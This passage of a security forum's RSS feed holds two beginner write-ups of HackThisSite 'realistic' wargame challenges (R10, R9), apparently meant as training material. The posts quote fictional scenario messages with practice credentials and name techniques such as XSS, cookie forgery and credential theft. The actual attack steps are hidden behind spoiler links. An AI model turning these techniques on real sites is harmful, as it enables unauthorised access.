+Some Advice will here will be usefull and correct me if I’m  wrong somewhere in this.</p>
+            <p><small>8 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/google-recovery-based-password-reset-flaw/2482">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/google-recovery-based-password-reset-flaw/2482</link>
+          <pubDate>Tue, 20 Jun 2017 12:04:04 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-2482</guid>
+          <source url="https://d.clarkee.co.uk/t/google-recovery-based-password-reset-flaw/2482.rss">Google Recovery Based Password Reset Flaw</source>
+        </item>
+        <item>
+          <title>HTS.org R10 challenge</title>
+          <dc:creator><![CDATA[ricksanchez]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <h1><a name="p-10691-preface-1" class="anchor" href="https://d.clarkee.co.uk#p-10691-preface-1"></a>Preface</h1>
+<p>As always:<br>
+I stated my reasoning behind this article series in the first article which can be found <a href="https://0x00sec.org/t/hts-org-r1-challenge/">here</a>.<br>
+To avoid redundancy please check out the preface over there and let’s get right into action!</p>
+<p><em><strong>note:</strong></em> If I write non sense in this and the next following articles please correct me for the sake of me and others not getting confused and mixed up with things <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> .</p>
+<h4><a name="p-10691-author-assigned-level-wannabe-2" class="anchor" href="https://d.clarkee.co.uk#p-10691-author-assigned-level-wannabe-2"></a>Author Assigned Level: Wannabe</h4>
+<h4><a name="p-10691-community-assigned-level-3" class="anchor" href="https://d.clarkee.co.uk#p-10691-community-assigned-level-3"></a>Community Assigned Level:</h4>
+<p><a href="https://d.clarkee.co.uk/t/hts-org-r10-challenge/2380/1">Click to view the poll.</a></p>
+<h4><a name="p-10691-required-skills-4" class="anchor" href="https://d.clarkee.co.uk#p-10691-required-skills-4"></a>Required Skills</h4>
+<p>Since we’re starting at the beginning not much knowledge is required at the moment.</p>
+<h4><a name="p-10691-disclaimer-5" class="anchor" href="https://d.clarkee.co.uk#p-10691-disclaimer-5"></a>Disclaimer</h4>
+<p>These write ups are only my 2 cents on the challenges. So don’t take them too seriously. <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+<hr>
+<h1><a name="p-10691-htsorg-realistic-challenges-6" class="anchor" href="https://d.clarkee.co.uk#p-10691-htsorg-realistic-challenges-6"></a><a href="http://HTS.org">HTS.org</a> realistic challenges</h1>
+<h3><a name="p-10691-realistic-challenge-10httpswwwhackthissiteorgmissionsrealistic10-7" class="anchor" href="https://d.clarkee.co.uk#p-10691-realistic-challenge-10httpswwwhackthissiteorgmissionsrealistic10-7"></a><a href="https://www.hackthissite.org/missions/realistic/10/">Realistic challenge 10</a></h3>
+<h4><a name="p-10691-message-8" class="anchor" href="https://d.clarkee.co.uk#p-10691-message-8"></a>Message:</h4>
+<blockquote>
+<p>hey man, it’s me Zach, I need a favor from you, I’m in big trouble.<br>
+if you’ll remember, I go to that super uptight religious school. well, two of my teachers are failing me because my lifestyle does not fall in line with their moralistic rules for public behavior. My gym teacher even called me a ‘long-haired hippie faggot’! And if I fail any classes, I won’t graduate.<br>
+Listen, can you hack into the school’s grade database and make it so I’m passing all my classes? I know they have this system set up on their website that allows teachers to submit grades and stuff, and I heard you pulled a few things in the past as well. Their web master was not thinking in terms of computer security when he was designing the website, so it might be easy. Or not. Please check it out here. The user name to my account is ‘Zach Sanchez’ and my password is ‘liberty638’. Thanks man!</p>
+</blockquote>
+<h4><a name="p-10691-what-can-we-extract-from-the-message-9" class="anchor" href="https://d.clarkee.co.uk#p-10691-what-can-we-extract-from-the-message-9"></a>What can we extract from the message?</h4>
+<ul>
+<li>theres a database</li>
+<li>teacher have a grade submit system</li>
+<li>we have a user login Zach Sanchez/liberty638</li>
+</ul>
+<h3><a name="p-10691-the-site-10" class="anchor" href="https://d.clarkee.co.uk#p-10691-the-site-10"></a>The site:</h3>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/4/4988490908ba2f297167f440c88bcbf14a28f6fd.png" data-download-href="/uploads/short-url/auuQp63HKO1dGgEaxk7r3d4b59P.png?dl=1" title="Screenshot at 2017-06-13 19-58-52.png"><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4988490908ba2f297167f440c88bcbf14a28f6fd.png" width="636" height="500"></a></div><p></p>
+<ul>
+<li>A bunch of links to follow.</li>
+<li>We have a student login</li>
+<li>We have a teacher login</li>
+<li>We have a staff list with names and email addresses</li>
+</ul>
+<h3><a name="p-10691-the-source-11" class="anchor" href="https://d.clarkee.co.uk#p-10691-the-source-11"></a>The source</h3>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/0/095a4b71089d388d8efe585381d2fac5b5881bf3.png" data-download-href="/uploads/short-url/1kJKFsT7qO5WtUuCZZz4ZzxrYJ5.png?dl=1" title="Screenshot at 2017-06-13 19-59-14.png"><img src="//0x00sec.s3.amazonaws.com/original/2X/0/095a4b71089d388d8efe585381d2fac5b5881bf3.png" width="690" height="338"></a></div><p></p>
+<h3><a name="p-10691-the-hack-12" class="anchor" href="https://d.clarkee.co.uk#p-10691-the-hack-12"></a>The ‘hack’</h3>
+<div class="spoiler"><a href="https://d.clarkee.co.uk/t/hts-org-r10-challenge/2380/1">spoiler</a></div>
+<h1><a name="p-10691-conclusions-13" class="anchor" href="https://d.clarkee.co.uk#p-10691-conclusions-13"></a>Conclusions</h1>
+<p>This time around we had some combination of cookie forgery, login credential stealing, and URL forgery.<br>
+This challenge aimed at being a small pain in the bumhole with all these small obstacles, but in the end not much tools and knowledge were necessary to solve those.<br>
+The next article of the series can be found <a href="https://0x00sec.org/t/hts-org-r11-challenge/">here</a> once it’s up!!</p>
+<h1><a name="p-10691-past-challenges-14" class="anchor" href="https://d.clarkee.co.uk#p-10691-past-challenges-14"></a>past challenges</h1>
+<ul>
+<li><a href="https://0x00sec.org/t/hts-org-r1-challenge/">challenge R1</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r2-challenge/">challenge R2</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r3-challenge/">challenge R3</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r4-challenge/">challenge R4</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r5-challenge/">challenge R5</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r6-challenge/">challenge R6</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r7-challenge/">challenge R7</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r8-challenge/">challenge R8</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r9-challenge/">challenge R9</a></li>
+</ul>
+<p>Stay tuned <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+            <p><small>5 posts - 4 participants</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/hts-org-r10-challenge/2380">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/hts-org-r10-challenge/2380</link>
+          <pubDate>Wed, 14 Jun 2017 09:41:00 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-2380</guid>
+          <source url="https://d.clarkee.co.uk/t/hts-org-r10-challenge/2380.rss">HTS.org R10 challenge</source>
+        </item>
+        <item>
+          <title>HTS.org R9 challenge</title>
+          <dc:creator><![CDATA[ricksanchez]]></dc:creator>
+          <category>Web Hacking</category>
+          <description><![CDATA[
+            <h1><a name="p-10576-preface-1" class="anchor" href="https://d.clarkee.co.uk#p-10576-preface-1"></a>Preface</h1>
+<p>As always:<br>
+I stated my reasoning behind this article series in the first article which can be found <a href="https://0x00sec.org/t/hts-org-r1-challenge/">here</a>.<br>
+To avoid redundancy please check out the preface over there and let’s get right into action!</p>
+<p><em><strong>note:</strong></em> If I write non sense in this and the next following articles please correct me for the sake of me and others not getting confused and mixed up with things <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> .</p>
+<h4><a name="p-10576-author-assigned-level-wannabe-2" class="anchor" href="https://d.clarkee.co.uk#p-10576-author-assigned-level-wannabe-2"></a>Author Assigned Level: Wannabe</h4>
+<h4><a name="p-10576-community-assigned-level-3" class="anchor" href="https://d.clarkee.co.uk#p-10576-community-assigned-level-3"></a>Community Assigned Level:</h4>
+<p><a href="https://d.clarkee.co.uk/t/hts-org-r9-challenge/2340/1">Click to view the poll.</a></p>
+<h4><a name="p-10576-required-skills-4" class="anchor" href="https://d.clarkee.co.uk#p-10576-required-skills-4"></a>Required Skills</h4>
+<p>Since we’re starting at the beginning not much knowledge is required at the moment.</p>
+<ul>
+<li>knowledge about html</li>
+<li>knowledge about web page structure</li>
+<li>cookies</li>
+<li>javscript</li>
+<li>xss</li>
+</ul>
+<h4><a name="p-10576-disclaimer-5" class="anchor" href="https://d.clarkee.co.uk#p-10576-disclaimer-5"></a>Disclaimer</h4>
+<p>These write ups are only my 2 cents on the challenges. So don’t take them too seriously. <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+<hr>
+<h1><a name="p-10576-htsorg-realistic-challenges-6" class="anchor" href="https://d.clarkee.co.uk#p-10576-htsorg-realistic-challenges-6"></a><a href="http://HTS.org">HTS.org</a> realistic challenges</h1>
+<h3><a name="p-10576-realistic-challenge-9httpswwwhackthissiteorgmissionsrealistic9-7" class="anchor" href="https://d.clarkee.co.uk#p-10576-realistic-challenge-9httpswwwhackthissiteorgmissionsrealistic9-7"></a><a href="https://www.hackthissite.org/missions/realistic/9/">Realistic challenge 9</a></h3>
+<h4><a name="p-10576-message-8" class="anchor" href="https://d.clarkee.co.uk#p-10576-message-8"></a>Message:</h4>
+<blockquote>
+<p>I’ve heard you’re good at hacking, and on the right side of things. So I came looking for you. I really need help, you see, my boss has stopped paying our salaries and I’m going to miss my rent! Please help me get my money, you can reach the site at Crappy Soft. They have an online payment system, but only he can use it. Maybe you can get into his account somehow, but for now you can use mine:</p>
+</blockquote>
+<blockquote>
+<p>Username: <a href="mailto:r-conner@crappysoft.com">r-conner@crappysoft.com</a><br>
+Password: ilovemywork</p>
+</blockquote>
+<blockquote>
+<p>Thanks man, good luck.</p>
+</blockquote>
+<h4><a name="p-10576-what-can-we-extract-from-the-message-9" class="anchor" href="https://d.clarkee.co.uk#p-10576-what-can-we-extract-from-the-message-9"></a>What can we extract from the message?</h4>
+<ul>
+<li>Find the admin account</li>
+<li>Pay him</li>
+<li>???</li>
+</ul>
+<h3><a name="p-10576-the-site-10" class="anchor" href="https://d.clarkee.co.uk#p-10576-the-site-10"></a>The site:</h3>
+<p>The usual stuff.</p>
+<ul>
+<li>Login form</li>
+<li>pictures</li>
+<li>links</li>
+</ul>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/7/79d9d10b986e95161c6ed2b356f7779d37ea3195.png" data-download-href="/uploads/short-url/hnWrvYkKq44e7HlsTXEWNWTZv6t.png?dl=1" title="Screenshot at 2017-06-13 11-21-42.png"><img src="//0x00sec.s3.amazonaws.com/original/2X/7/79d9d10b986e95161c6ed2b356f7779d37ea3195.png" width="690" height="334"></a></div><p></p>
+<h3><a name="p-10576-the-source-11" class="anchor" href="https://d.clarkee.co.uk#p-10576-the-source-11"></a>The source</h3>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/4/48d4b74eac9f028469a8566c45003b2b638aa350.png" data-download-href="/uploads/short-url/aoi7qSo6shAe797qY40Mu11KDUA.png?dl=1" title="Screenshot at 2017-06-13 11-21-58.png"><img src="//0x00sec.s3.amazonaws.com/original/2X/4/48d4b74eac9f028469a8566c45003b2b638aa350.png" width="690" height="438"></a></div><p></p>
+<h3><a name="p-10576-the-hack-12" class="anchor" href="https://d.clarkee.co.uk#p-10576-the-hack-12"></a>The ‘hack’</h3>
+<div class="spoiler"><a href="https://d.clarkee.co.uk/t/hts-org-r9-challenge/2340/1">spoiler</a></div>
+<h1><a name="p-10576-conclusions-13" class="anchor" href="https://d.clarkee.co.uk#p-10576-conclusions-13"></a>Conclusions</h1>
+<p>This challenge dealt with similar attack vectors as the last one, but this  challenge wasn’t much fun in my opinion.. Hence I just wanted to finish is quickly and put it out here to continue with the series.</p>
+<p>The next article of the series can be found <a href="https://0x00sec.org/t/hts-org-r10-challenge/">here</a> once it’s up!!</p>
+<h1><a name="p-10576-past-challenges-14" class="anchor" href="https://d.clarkee.co.uk#p-10576-past-challenges-14"></a>past challenges</h1>
+<ul>
+<li><a href="https://0x00sec.org/t/hts-org-r1-challenge/">challenge R1</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r2-challenge/">challenge R2</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r3-challenge/">challenge R3</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r4-challenge/">challenge R4</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r5-challenge/">challenge R5</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r6-challenge/">challenge R6</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r7-challenge/">challenge R7</a></li>
+<li><a href="https://0x00sec.org/t/hts-org-r8-challenge/">challenge R8</a></li>
+</ul>
+<p>Stay tuned <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+            <p><small>1 post - 1 participant</small></p>
+            <p><a href="https://d.clarkee.co.uk/t/hts-org-r9-challenge/2340">Read full topic</a></p>
+          ]]></description>
+          <link>https://d.clarkee.co.uk/t/hts-org-r9-challenge/2340</link>
+          <pubDate>Tue, 13 Jun 2017 09:48:02 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>No</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">d.clarkee.co.uk-topic-2340</guid>
+          <source url="https://d.clarkee.co.uk/t/hts-org-r9-challenge/2340.rss">HTS.org R9 challenge</source>
+        </item>
+  </channel>
+</rss>
